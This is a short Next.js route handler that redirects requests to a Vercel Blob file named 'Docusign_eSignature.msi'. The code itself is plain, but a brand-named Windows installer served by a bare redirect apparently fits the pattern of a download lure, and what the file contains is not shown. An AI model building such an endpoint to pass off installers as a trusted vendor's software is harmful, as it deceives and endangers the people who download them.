import { list } from '@vercel/blob'
import { NextResponse } from 'next/server'

export const dynamic = 'force-dynamic'

export async function GET() {
  const { blobs } = await list({ prefix: 'Docusign_eSignature.msi' })
  
  if (!blobs.length) {
    return NextResponse.json({ error: 'File not found' }, { status: 404 })
  }

  return NextResponse.redirect(blobs[0].url)
}
